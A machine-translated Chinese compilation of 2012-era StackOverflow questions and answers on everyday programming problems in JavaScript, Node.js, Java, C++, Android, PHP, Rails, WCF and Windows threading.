# StackOverflow 问答 11396000-11396999

# javascript - 在 webview 中触发后退按钮

> ID：11396000
> 
> 赞同：0
> 
> 时间：2012-07-09T13:26:47.380
> 
> 标签：javascript, mobile, titanium, appcelerator

我正在使用钛工作室来打包我们目前正在开发的应用程序，其中一个页面是我们网站移动版本的网络视图。这一切都有效并且看起来很棒，但是当用户导航到一个新的 url 时，向后退是不可能的。我尝试了几种方法来设置后退按钮/导航组来解决这个问题，但似乎没有任何效果。将下一页加载到导航组或触发后退按钮以在加载新页面时出现的最佳方法是什么？

到目前为止，我已经尝试过：

*   创建导航组并在打开新窗口时触发事件以将其添加为子级。
*   创建一个按钮并删除/添加它取决于`canGoBack()`
*   存在一个常量按钮，只有在`goBack()`定义时才会触发

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-16T06:41:25.347

```
var btnBack = Titanium.UI.createButton({
    title : '< ',
    top : 0,
    left : 0,
    height : '10%',
});
var btnFwd = Titanium.UI.createButton({
    title : ' >',
    top : 0,
    right : 0,
    height : '10%',
});
var webView = Titanium.UI.createWebView({
    url : 'http://gooogle.com',
    canGoBack : true,
    canGoForward : true,
    top : '10%',
    height : '90%',
});
btnBack.addEventListener('click', function() {
    webView.goBack();
});
btnFwd.addEventListener('click', function() {
    webView.goForward();
});
var win1 = Titanium.UI.createWindow({  
    backgroundColor:'#fff',
});
win1.add(btnBack);
win1.add(btnFwd);
win1.add(webView);
win1.open(); 
```

这能解决您的问题吗？如果没有，请澄清你需要做什么？

# node.js - Nodejs：Expressjs 和 Restify 结构

> ID：11396001
> 
> 赞同：0
> 
> 时间：2012-07-09T13:26:47.523
> 
> 标签：node.js, express, restify

我打算设计一个提供api和网站的网络应用程序，这是因为该应用程序可以与移动设备一起使用。

我目前正在使用 node-restify 来提供 api，但现在我需要一种方法来提供应用程序的动态页面。

我最初的想法是只使用 ExpressJS 来提供页面和 API，但我读过 node-restify 更快。现在我的问题是，使用 restify 我无法提供以 ejs 呈现的 html 页面。

有没有办法只拥有一个应用程序并将 express 与 restify 集成。

有什么建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T13:50:33.910

你在这里写的很有趣，因为根据这个基准（2012 年 3 月 16 日）：

[http://blog.perfectapi.com/2012/benchmarking-apis-using-perfectapi-vs-express.js-vs-restify.js/](http://blog.perfectapi.com/2012/benchmarking-apis-using-perfectapi-vs-express.js-vs-restify.js/)

Restify比 Express 慢**很多。**

Express 可以轻松处理每秒约 1500 个请求，而 Restify 每秒仅处理约 250 个请求。

但即使他们已经改进了 Restify，我怀疑它是否会比 Express 更快，因为 Express 已经非常快了。更不用说它是带有非常有用的其他工具的整个框架。

结论：使用 Express.js。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-01-13T06:19:04.360

看看这个 api：

[https://github.com/rahpal/RestOnNode](https://github.com/rahpal/RestOnNode)

NodeJS 上的 RESTful 框架

该项目是使用相同的项目架构构建的，随后是 ASP.Net WebApi 2.0。这意味着它将拥有控制器、身份验证机制等。您需要做的就是创建自己的控制器。

# java - 从没有包装器的 Jar 文件运行 VM 参数

> ID：11396009
> 
> 赞同：0
> 
> 时间：2012-07-09T13:27:39.237
> 
> 标签：java, executable-jar, jvm-arguments

指的是：[Runnable jar with jvm args](https://stackoverflow.com/questions/2257166/runnable-jar-with-jvm-args)

我知道可以使用嵌入式 VM 参数从 netbeans 构建/导出可运行的 jar。但我正试图转向日食并尝试一些东西。有没有办法在 Eclipse 中做到这一点，而不必像批处理或包装器一样获得外部启动器？

编辑：我尝试让第二个主类使用参数启动 jar，但它似乎仍然无法正常工作：

```
 public static void main(String[] args) {

     try {
            Process exec = Runtime.getRuntime().exec("java -Dsun.java2d.opengl=true -splash:splash.png -jar Radiance.jar");
        } catch (IOException e) {

            e.printStackTrace();
        }

     } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T13:30:25.497

这样做的唯一方法是使用默认程序，使用带有所需 VM 参数的 JAR 启动第二个程序。即 JAR 也是您的启动程序。你的 JAR 中可以有任意数量的`main(String[])`。

# jquery - 两个固定的 div - 左右

> ID：11396012
> 
> 赞同：1
> 
> 时间：2012-07-09T13:27:56.740
> 
> 标签：jquery, css, positioning, fixed

我想在我的网页上创建两个固定的 div。第一个应该在左边，第二个在右边。我创建了一些代码，但它并不完美。

演示[在这里](http://zsws.tk)

我不知道如何纠正它。有什么解决办法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T13:32:30.113

通过提供`margin`等于固定列宽度的**#main**，它将防止该区域向左折回。当您应用`position:fixed`到列时，它会将这些元素从文档流中取出。

由于`position:fixed`动态应用到列（通过使用 JS），如果仅出于计时目的，您也可以考虑动态应用`margin`到**#main 。**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T15:31:48.517

当页面滚动时，您通过应用类和`position:fixed`为您的`#aside`and元素设置 a 。`#bside``fixed``fixed2`

由于`position:fixed`当应用于`#aside`and时`#bside`，将它们从文档流中取出，因此元素`#main`按预期向左浮动。

为了避免更改您当前的代码，一个简单的解决方案是使用一个类为您的`#main`元素设置某些样式，并根据需要应用该类：

请参阅此[工作小提琴](http://jsfiddle.net/zuul/NV24K/)示例。

**CSS**

```
.fixMiddle {
    position: relative;
    left: 190px;         /* your #aside width+padding+border */
} 
```

**jQuery**

```
if ($('#aside').hasClass('fixed')) {
  $('#main').addClass('fixMiddle');
} else {
  $('#main').removeClass('fixMiddle');
} 
```

# android - 获取 Android 上的活动驱动程序列表

> ID：11396023
> 
> 赞同：3
> 
> 时间：2012-07-09T13:28:38.620
> 
> 标签：android, linux, drivers

是否有一种简单的方法可以获取当前在 Android 设备上使用的驱动程序列表？`lsmod`列出了少量驱动程序（3），但我猜大多数驱动程序都编译到内核而不是模块中。

显然，由于设备本身缺乏开发工具，诸如此类的事情`make menuconfig`没有机会工作。我*可以*下载内核源代码，但我希望避免安装整个交叉编译工具链只是为了满足我的好奇心。

我知道[这个问题](https://stackoverflow.com/questions/8901631/how-can-i-get-a-list-of-all-the-active-kernel-drivers-on-my-android-system)，但除了指出*为什么* `lsmod`在这种情况下不起作用之外，它并没有真正回答我的问题。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-09T13:37:10.500

`/proc/config.gz`应该告诉您相同的信息，您会在`make menuconfig`.

```
adb pull /proc/config.gz .
zcat /proc/config.gz | less 
```

编辑：还考虑浏览`sysfs`内置插件：

```
ls -l /sys/module 
```

# c++ - 使用字符串时遇到问题

> ID：11396027
> 
> 赞同：1
> 
> 时间：2012-07-09T13:29:05.187
> 
> 标签：c++

我是初学者。我不知道为什么我不能使用字符串。它说`string does not have a type`。

**主文件**

```
 #include <iostream>
    #include <string>
    #include "Pancake.h"

using namespace std;

int main() {

    Pancake good;

    good.setName("David");

    cout << good.name << endl;

} 
```

**煎饼.h**

```
#ifndef PANCAKE_H
#define PANCAKE_H
#include <string>

class Pancake {
    public:
        void setName( string x );
        string name;
    protected:
    private:
};

#endif // PANCAKE_H 
```

**煎饼.cpp**

```
#include <iostream>
#include "Pancake.h"
#include <string>

using namespace std;

void Pancake::setName( string x ) {
    name = x;
} 
```

这仅在我使用字符串时发生。当我在它的所有实例中使用整数并替换`string x`为时，它就会起作用。但为什么？`int x``string x`

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-09T13:30:22.110

您只是在头文件中省略了名称空间：

```
#ifndef PANCAKE_H
#define PANCAKE_H
#include <string>

class Pancake {
    public:
        void setName( std::string x );
        std::string name;
    protected:
    private:
};

#endif // PANCAKE_H 
```

最好避免`using namespace ...`并接受在命名空间前附加的额外类型。

# ruby-on-rails-3 - has_many 多个外键搜索

> ID：11396030
> 
> 赞同：0
> 
> 时间：2012-07-09T13:29:21.767
> 
> 标签：ruby-on-rails-3

```
User
 #

Cars
 belongs_to :father, :class_name => "User"
 belongs_to :user

user = User.find(1) 
```

伙计们帮助我可以通过键入`user.cars`（使用搜索汽车`user_id`）来获取用户的汽车，但是我究竟怎样才能让它使用father_id进行搜索？

显然我可以做一个`Car.find_by_creator_id(...)`，但我想知道是否有一个轨道解决方案。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:19:10.800

您可以设置关系的另一侧并在模型`:inverse_of`中为每个关系指定。`User`就像是

```
class User < ActiveRecord::Base
  has_many :father_cars, :class_name => "Car", :inverse_of => :father
  has_many :cars, :inverse_of => :user

  # ...
end

Cars < ActiveRecord::Base
  belongs_to :father, :class_name => "User", :inverse_of => :father_cars
  belongs_to :user, :inverse_of => :cars

  # ...
end 
```

然后，您可以访问`:father`与

```
u = User.find(1)
cars = user.father_cars 
```

# android - 如果文本太长，将两个并排的文本视图移动到另一个下方

> ID：11396031
> 
> 赞同：3
> 
> 时间：2012-07-09T13:29:23.220
> 
> 标签：android, android-layout, textview

我有两个这样的文本视图：

```
=======================
= TextView1 TextView2 =
======================= 
```

而且我想检测文本视图何时太长以至于它们显示如下：

```
=======================
=      TextView1      =
=      TextView2      =
======================= 
```

目前对于较长的文本，它显示如下：

```
=======================
= TextView1 Text      =
=           View2     =
======================= 
```

我该怎么做，这样当文本很短时，文本视图并排，当文本太长时，第二个文本视图不会被拆分而是移动到第二行？

我坚持创建单个文本视图并根据长度构建文本的解决方案（文本 1 + 填充 + 文本 2 如果短，文本 1 + "\n" + 文本 2 如果长）但我不喜欢这个解决方案。

有什么方法可以检测第二个文本是否会被拆分，从而改变包含水平 cu 垂直文本视图的布局的方向？

**更新**

这是我的xml：

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
              android:layout_width="fill_parent"
              android:layout_height="fill_parent"
              android:gravity="center">

    <TextView
        android:id="@+id/my_text_1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_gravity="center_vertical"
        android:padding="10dp"
        android:text="@string/text1"/>

    <TextView
        android:id="@+id/my_text_2"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_gravity="center_vertical"
        android:layout_marginRight="5dp"/>

</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-10T15:53:32.903

我找到了更好的解决方案。将我的文本视图更改为可自动调整大小的文本视图（更多信息[在这里](https://stackoverflow.com/questions/5033012/auto-scale-textview-text-to-fit-within-bounds)）

此外，每个 textview 都在一个单独的布局中，以确保两个 textview 的大小都调整为相同的值。我的 xml 看起来像这样：

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
              android:layout_width="fill_parent"
              android:layout_height="fill_parent"
              android:id="@+id/value_linear_layout"
              android:gravity="center">

    <LinearLayout 
            android:layout_width="wrap_content"
            android:layout_weight="1"
            android:layout_height="wrap_content">
        <com.mihaela.view.AutoResizeTextView
            android:id="@+id/my_text_1"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"/>
    </LinearLayout>

    <LinearLayout 
            android:layout_width="wrap_content"
            android:layout_weight="1"
            android:layout_height="wrap_content">

        <com.mihaela.view.AutoResizeTextView
            android:id="@+id/my_text_2"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"/>
    </LinearLayout>

</LinearLayout> 
```

我已经从**AutoResizeTextView实现了****OnTextResizeListener**来做到这一点：

 **```
public class TextWidthResizeListener implements OnTextResizeListener {

    @Override
    public void onTextResize(TextView textView, float oldSize, float newSize) {
        TextPaint paint = textView.getPaint();
        if (paint.measureText(textView.getText().toString()) > (valueLinearLayout.getWidth() / 2)){
            valueLinearLayout.setOrientation(LinearLayout.VERTICAL);
        }
    }
} 
```

其中 valueLinearLayout 是：

```
valueLinearLayout = (LinearLayout)findViewById(R.id.value_linear_layout); 
```

这个解决方案最适合我，因为文本视图在它们并排时被标注尺寸直到最小尺寸。当达到最小尺寸时，文本仍然不适合，textviews 将在另一个下对齐。

此外，这种带有监听器的想法也可以应用于不可调整大小的文本视图。我会将此答案设置为正确答案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T13:39:28.427

您应该使用单行多行`TextView`并将文本设置如下：

```
mTextView.setText(text1+" "+text2); 
```

或者

```
mTextView.setText(text1+"\n"+text2); 
```

取决于您的特定需求。

**编辑：**您可以在 中指定您的文本`html`，然后[`Html.fromHtml(htmlString)`](http://developer.android.com/reference/android/text/Html.html)在您的`TextView`.

```
 String text1 ="<font color=\"red\">This is some text!</font>"
 String text2="<font color=\"blue\">This is some other text!</font>"
 textView.setText(Html.fromHtml(text1+ "<br/>"+ text2); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-05-27T23:51:55.093

我对接受的答案做了一个稍微不同的版本。我没有以任何方式更改我的布局 xml，也没有使用`onTextResize()`，或者`AutoResizeTextView`因为这对我的情况来说似乎有点矫枉过正。如果设备的语言设置导致使用长字符串，我需要我的 LinearLayout 从水平方向切换到垂直方向。

**布局**

```
<LinearLayout
    android:id="@+id/customer_care_bottom_layout"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:gravity="center_horizontal"
    android:orientation="horizontal"
    android:layout_marginBottom="@dimen/lmargin_bottom_10">

    <TextView
        android:id="@+id/customer_care_title"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="@string/CUSTOMER_CARE_TITLE" />

    <TextView
        android:id="@+id/customer_care_number_information"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="@string/CUSTOMER_CARE_INFORMATION"/>
</LinearLayout> 
```

**爪哇**

```
private void setCustomerServiceLayoutOrientationBasedOnTextWidth() {
        TextPaint paint = customer_care_number_text.getPaint();
        TextView tvCustomerCareTitle = (TextView) findViewById(R.id.customer_care_title);
        TextView tvCustomerCareInformation = (TextView) findViewById(R.id.customer_care_information);
        int halfCustomerServiceLayoutWidth = getScreenWidth() / 2;
        boolean isCustomerCareTitleTooLong = paint.measureText(tvCustomerCareTitle.getText().toString()) > customerServiceLayoutWidth;
        boolean isCustomerCareInformationTooLong = paint.measureText(tvCustomerCareInformation.getText().toString) > customerServiceLayoutWidth;

        if (isCustomerCareTitleTooLong || isCustomerCareInformationTooLong) {
            LinearLayout llCustomerCareBottom = (LinearLayout) findViewById(R.id.customer_care_bottom_layout);
            llCustomerCareBottom.setOrientation(LinearLayout.VERTICAL);
        }
    }

private int getScreenWidth() {
    int screenWidth;Display display = getWindowManager().getDefaultDisplay();
    if (Build.VERSION.SDK_INT < 13) {
        screenWidth = display.getWidth();
    } else {
        Point point = new Point();
        display.getSize(point);
        screenWidth = point.x;
    }
    return screenWidth;
} 
```**

# php - stdClass 到数组？

> ID：11396033
> 
> 赞同：23
> 
> 时间：2012-07-09T13:29:26.183
> 
> 标签：php

我有：

```
stdClass Object
(
    [0] => stdClass Object
        (
            [one] => aaa
            [two] => sss
        )

    [1] => stdClass Object
        (
            [one] => ddd
            [two] => fff
        )

    [2] => stdClass Object
        (
            [one] => ggg
            [two] => hhh
        )
} 
```

我**必须**用钥匙得到这个，例如：

```
$var = $stdClass[0]; 
```

但我有错误：

> 致命错误：不能使用 stdClass 类型的对象作为数组

是否可以将此 stdClass 解析为数组并将其与键一起使用？

* * *

## 回答 #1

> 赞同：69
> 
> 时间：2012-07-09T13:31:32.167

将其转换为数组：

```
$array = (array)$stdClass; 
```

* * *

## 回答 #2

> 赞同：36
> 
> 时间：2012-07-09T13:34:44.623

如果您要`json_decode`将该 JSON 字符串转换为对象，则可以使用第二个参数`json_decode($string, true)`，该参数会将对象转换为关联数组。

如果没有，其他人都说过的话，只需输入即可

`$array = (array) $stdClass;`

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2013-10-11T07:33:56.097

自从询问以来，您的问题可能已经解决，但作为参考，谷歌叔叔的快速回答：

```
function objectToArray($d) {
  if(is_object($d)) {
    $d = get_object_vars($d);
  }
  if(is_array($d)) {
    return array_map(__FUNCTION__, $d); // recursive
  } else {
    return $d;
  }
} 
```

全文[在这里](http://www.if-not-true-then-false.com/2009/php-tip-convert-stdclass-object-to-multidimensional-array-and-convert-multidimensional-array-to-stdclass-object/)。请注意，我与原作者没有任何关联。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2012-07-09T13:31:49.493

投射它

```
$array = (array) $stdObject; 
```

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2012-07-09T15:03:28.757

当然，您可以进行类型转换，`$var = (array) $obj;`但我会建议[`ArrayAccess`](http://us.php.net/arrayaccess)您的班级。

通过使用`ArrayAccess`，您可以将您的对象和数据视为一个数组，或者本机视为一个对象。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2012-07-09T13:33:15.587

将其转换为数组。目前 PHP 无法将其作为数组读取。

```
$array = (array)$stdClass; 
```

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2012-07-09T13:34:16.497

本质上，只需键入 cast 即可：

```
$arr = (array)$obj;
$var = $arr[0]; 
```

但请阅读[此处](http://ca2.php.net/manual/en/language.types.array.php#language.types.array.casting)的注意事项。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2018-08-17T06:50:47.507

如果您有一个嵌套数组，您可以使用`json_encode`并将`json_decode`整个对象转换为数组：

```
$result = json_decode(json_encode($source), JSON_OBJECT_AS_ARRAY); 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2017-06-09T09:03:46.117

这个对我有用，解码和编码构成了一个常规数组

`$array = json_decode(json_encode($object), True);`

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2020-05-02T00:06:39.183

```
function load_something () : \stdClass {

    $result = new \stdClass();

    $result->varA   = 'this is the value of varA';
    $result->varB   = 'this is the value of varB';
    $result->varC   = 'this is the value of varC';

    return $result;
}

$result = load_something();

echo ($result instanceof stdClass)?'Object is stdClass':'Object is not stdClass';
echo PHP_EOL;

print_r($result);

//directly extract a variable from stdClass 
echo PHP_EOL . 'varA = ' . ($result->varA);

//convert to array, then extract
$array = (array)$result;
echo PHP_EOL . 'varA = ' . $array['varA']; 
```

* * *

## 回答 #11

> 赞同：-3
> 
> 时间：2012-07-09T13:38:31.627

stdClass 是一个对象，因此您可以从中访问值

```
echo stdClass->one; 
```

# c - 无法从 Windows 64 位进程获取线程上下文

> ID：11396034
> 
> 赞同：2
> 
> 时间：2012-07-09T13:29:30.027
> 
> 标签：c, visual-studio-2010, visual-studio, winapi, 64-bit

您好，我正在尝试获取系统上 64 位进程的线程上下文。我尝试过使用具有正确功能的 32 位和 64 位解决方案。但我总是以错误'0x57'，无效参数结束。来自 64 位代码的简短示例。

```
// open a handle to the thread
HANDLE hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | 
THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION, FALSE,
        atoi(argv[1]));
if(hThread  == NULL) {
    printf("Error opening thread handle.. 0x%08x\n", GetLastError());
    return 0;
}

// suspend the thread
if(Wow64SuspendThread(hThread ) == -1) {
    printf("Error suspending thread.. 0x%08x\n", GetLastError());
    CloseHandle(hThread );
    return 0;
}

// get the thread context
WOW64_CONTEXT orig_ctx = {WOW64_CONTEXT_FULL };
if(GetThreadContext(hThread , &orig_ctx) == FALSE) {
    printf("Error  0x%08x\n", GetLastError());
    CloseHandle(hThread );
    return 0;
} 
```

我怀疑句柄是错误的，代码在 32 位进程上正常工作。我将不胜感激任何帮助或建议。提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T19:51:55.723

以下代码在编译为 64 位应用程序时成功检索 64 位线程的线程上下文。

```
// threadcontext.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>
#include <tchar.h>

int _tmain(int argc, _TCHAR* argv[])
{
    // open a handle to the thread
    HANDLE hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | 
    THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION, FALSE, _ttoi(argv[1]));

    if(hThread  == NULL) {
        printf("Error opening thread handle.. 0x%08x\n", GetLastError());
        return 0;
    }   

    // suspend the thread
    if(SuspendThread(hThread ) == -1) {
        printf("Error suspending thread.. 0x%08x\n", GetLastError());
        CloseHandle(hThread );
        return 0;
    }

    // get the thread context
    CONTEXT orig_ctx = { 0 };
    orig_ctx.ContextFlags = CONTEXT_FULL;
    if(GetThreadContext(hThread , &orig_ctx) == FALSE) {
        printf("Error  0x%08x\n", GetLastError());
        CloseHandle(hThread );
        return 0;
    }

    return 0;
} 
```

需要注意的一件事是，没有混合常规调用和 Wow64 调用。Wow64 调用用于获取有关在 64 位系统上运行的 32 位进程的信息。

另一个更正是 ContextFlags 成员的设置。您试图在初始化期间设置它，但 ContextFlags 成员不是结构中的第一个成员。

# c# - 实时分析数据

> ID：11396036
> 
> 赞同：2
> 
> 时间：2012-07-09T13:29:40.153
> 
> 标签：c#, jquery, asp.net, node.js, analytics

我正计划为我的网站创建一个实时分析页面——有点像谷歌分析，但真实的实时数据会随着新用户在我的网站上加载页面等而改变。

主站点是/将使用 Asp.Net/C# 作为后端和 MS SQL 数据库编写，前端将支持**JavaScript** (JQuery)、**CSS3**、**HTML5**（如果需要）等内容。

我想知道我可以使用哪些方法来进行实时分析；如何将数据放到分析页面上，我可以使用什么**高效的图形，以及使用****快速输入/输出**存储数据。

 **我首先想到的是使用**Node.js——**我可以用它来实现实时分析页面吗？是个好主意吗？有没有更好的选择？这有什么缺点吗？

我是否需要在服务器上运行**C#**应用程序才能使用 Node.js 向网站发送/接收所有数据？

使用**MS SQL**数据库是否足够快？我是否需要实时存储所有数据，还是可以每 x 秒/分钟将其存储为块？（哪个更有效率？）

这说明了我对此事的初步想法—— ![Live Analytic 的流程图](../Images/e3772f8131ae834921d2f51f575990cb.png)

**编辑：**

我将在多个站点上使用这个系统，我一次可能会获得 10 次点击，达到大约 1,000,000 次（极不可能，但仍有可能）。我希望能够扩展这个系统并使其适应它所处的环境。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-09T13:55:34.943

这实际上取决于实时数据需要有多“实时”。例如，我最近做了这个：

[http://www.reed.co.uk/labs/realtime/](http://www.reed.co.uk/labs/realtime/)

其中显示了进入系统的工作申请。很明显，在繁忙时期有太多事情要实时查询主数据库——所以，我们要做的是查询一个滑动的“窗口”并将其缓存在服务器上——这是最后 5 分钟的一部分事件。

然后，我们将其回放给用户，就像它正在“现在”发生一样。作为 SLA 的一部分（用户并不真正关心）有一点延迟可以使整个系统的可扩展性大大提高。

[编辑-进一步解释]

数据只是从一个基本的存储过程调用中检索出来的——自然，像里德这样的大系统每秒有数百个事务——所以我们不能一直为每个用户访问主集群。

我们所做的就是确保我们有一个当前窗口，在本例中是缓存在服务器上的最后 5 分钟的数据。当客户端访问该站点时，我们会获取最后 5 分钟的数据，并像现在发生的那样播放它——最终用户并不聪明——但这意味着所有客户端都在读取缓存。缓存 5 分钟后，我们将其无效，然后重新开始。这意味着每五分钟最多 1 个 DB 命中 - 从而使系统的可扩展性大大提高（并不是它真的需要 - 因为它只是为了好玩，真的）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T13:55:03.180

只是为了让您知道谷歌分析已经提供实时用户跟踪。在谷歌分析网站的仪表板内时。单击顶部栏上的主页按钮，然后单击左侧栏上的实时按钮。考虑到这项服务的设计工作和质量，这似乎是一个比尝试重新创建其服务更好的选择。如果您确实选择继续创建自己的，那么您至少可以使用他们的服务作为所需功能的基准。

[使用像谷歌图表 API https://developers.google.com/chart/](https://developers.google.com/chart/)这样的 Api将是显示存储数据输出的好方法，同时减少了开发时间。如果您提供有关您预期的点击次数以及该软件将托管的服务器规模的更多信息，那么您将更容易回答速度问题。**

# wpf - 如何使 WPF MVVM 应用程序连接到多个 WCF 服务？

> ID：11396037
> 
> 赞同：0
> 
> 时间：2012-07-09T13:29:45.737
> 
> 标签：wpf, wcf, mvvm, loginview

我已经开发了 4 个 WCF 服务。

每个服务都负责其他事情。

每个服务都有一个*UserNamePasswordValidator*，因此客户端在连接时需要提供凭据。

我现在想在 MVVM 架构中开发我的 WPF 客户端应用程序。

我希望 WPF 应用程序加载***“登录”***屏幕，

用户将在其中输入用户名和密码，

然后这将被传递给 4 个 WCF 服务的 4 个客户端（都使用相同的用户名和密码）。

这样做的最佳方法是什么？

客户在哪里？在“模型”部分？哪个视图的模型？

WCF 服务需要被多个视图使用，所以我认为我不能将任何 WCF 服务客户端放在*特定*的模型类中......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T13:40:49.387

为此，我们创建了一个 ServiceFactory 类，该类连接到给定端点和适当的`IClientChannel`派生接口的服务。这假设您直接使用 WCF 服务，例如，不是通过 VS 生成的代理，因为您需要在每个客户端通道创建时设置用户名和密码值。

客户端通道接口与服务工厂一起位于外部“服务库”中，因此它们可以与 WCF 服务实现和客户端共享。我们将凭据存储在静态字典中（尽管您也将其放入主资源字典中），密码保存在 a`SecuredString`中以提供一点额外的安全性。

我已经通过博客描述了创建这样一个服务工厂的基本过程：

[http://blog.kutulu.org/2012/03/proxy-free-wcf-ditching-proxy.html](http://blog.kutulu.org/2012/03/proxy-free-wcf-ditching-proxy.html)

在我们的例子中，我们执行一个设置例程`App.xaml.cs`，提示输入凭据并尝试调用我们的服务之一，循环直到我们成功登录。该代码要复杂得多，但基本上是：

```
while (true)
{
  var factory = new ChannelFactory<ITestChannel>(new WSHttpBinding("SecuredBinding"));
  ITestChannel client = null;
  try
  {
    factory.Credentials.UserName.UserName = logOnModel.UserName;
    factory.Credentials.UserName.Password = logOnModel.Password;

    var address = Settings.Default.TestServiceUrlBase));
    client = factory.CreateChannel(address);

    break;
  }
  // Catch various exceptions here.
} 
```

这里的诀窍是，如果您的登录名或密码错误并且您`UsernamePasswordValidator`的登录失败，您将得到一个会导致您的频道出错`MessageSecurityException`的频道，因此您需要关闭它并打开一个新频道。但是一旦打开第一个通道，您就无法更改凭据`ChannelFactory`，因此您每次都需要处理并重新创建新工厂和新客户端通道。

如果 URL 错误，我们还会在此处检查`CommunicationException`和检查。`ArgumentException`

完成后，您可以在服务工厂类中使用类似的代码来构造客户端，给定其通道接口，并为每个调用设置凭据。（我们实际上为每个不同的接口缓存了服务工厂，因为我们经常创建和销毁通道，但这取决于你。）

# java - java.lang.reflect.InvocationTargetException：这是什么原因？

> ID：11396046
> 
> 赞同：1
> 
> 时间：2012-07-09T13:30:26.577
> 
> 标签：java, html, jar, applet

当我尝试运行小程序时出现以下异常：

```
java.lang.reflect.InvocationTargetException
at com.sun.deploy.util.DeployAWTUtil.invokeAndWait(Unknown Source)
at sun.plugin2.applet.Plugin2Manager.runOnEDT(Unknown Source)
at sun.plugin2.applet.Plugin2Manager.createApplet(Unknown Source)
at sun.plugin2.applet.Plugin2Manager$AppletExecutionRunnable.run(Unknown Source)
at java.lang.Thread.run(Unknown Source)
Caused by: java.lang.RuntimeException: java.lang.IllegalAccessException: Class sun.plugin2.applet.Plugin2Manager$12 can not access a member of class MyApplet with modifiers ""
at sun.plugin2.applet.Plugin2Manager$12.run(Unknown Source)
at java.awt.event.InvocationEvent.dispatch(Unknown Source)
at java.awt.EventQueue.dispatchEvent(Unknown Source)
at java.awt.EventDispatchThread.pumpOneEventForFilters(Unknown Source)
at java.awt.EventDispatchThread.pumpEventsForFilter(Unknown Source)
at java.awt.EventDispatchThread.pumpEventsForHierarchy(Unknown Source)
at java.awt.EventDispatchThread.pumpEvents(Unknown Source)
at java.awt.EventDispatchThread.pumpEvents(Unknown Source)
at java.awt.EventDispatchThread.run(Unknown Source)
    Caused by: java.lang.IllegalAccessException: Class sun.plugin2.applet.Plugin2Manager$12 can not access a member of class MyApplet with modifiers ""
at sun.reflect.Reflection.ensureMemberAccess(Unknown Source)
at java.lang.Class.newInstance0(Unknown Source)
at java.lang.Class.newInstance(Unknown Source)
... 9 more 
```

异常：java.lang.reflect.InvocationTargetException

*小程序代码：*

```
import javax.swing.*;
import java.awt.*;

class MyApplet extends JApplet {

public JFrame frame;
public JPanel panel;
public JButton button;

public void init() {
    frame = new JFrame();
    panel = new JPanel();
    button = new JButton("click me ");
    panel.setBackground(Color.RED);
    panel.add(button);
    frame.add(panel);
    frame.setSize(300,300);
    frame.setVisible(true);
}   
 } 
```

*HTML 文件：*

```
<applet code="MyApplet" codebase="AppletPackage" archive="JAR.jar" height="800" width="800"> 
```

**JAR.jar 包含一个名为 AppletPackage 的包，其中包含 MyApplet 类。它还包含自动添加的清单文件。**

问题是什么 ？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T13:32:30.737

An`InvocationTargetException`表明某些反射调用失败。似乎某些 Sun (Oracle) 类正在尝试使用反射来访问代码中的类。

您的课程`MyApplet`没有`public`范围修饰符。如果你添加它，我希望事情会奏效，因为这就是异常所抱怨的。

> 原因：java.lang.IllegalAccessException：类 sun.plugin2.applet.Plugin2Manager$12***无法访问带有修饰符“”的 MyApplet 类的成员***

# python - 为什么这个数据存储区按键查询返回无？

> ID：11396049
> 
> 赞同：0
> 
> 时间：2012-07-09T13:30:30.367
> 
> 标签：python, google-app-engine, datastore, gql

1）当我执行这个查询时：

```
contract_record = Contract(book_number = 42, initial_page = 420, final_page = 442)
contract_record.put()
contract_key = contract_record.key()
contract = db.GqlQuery("SELECT * FROM Contract WHERE __key__ = KEY('Contract', '$[contract_key]')").get() 
```

结果是无。为什么？

2）如何通过key_id而不是key进行查询？（像这样：

```
contract_id = contract_record.key().id()
contract = db.GqlQuery("SELECT * FROM Contract WHERE __key__ = KEY('Contract', '$[contract_id]')").get() 
```

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-09T13:50:50.007

应该是什么`'$[contract_key]'`？你想在这里做某种字符串替换吗？这真的不是它的工作原理。也许您的意思是使用`%s`运算符？

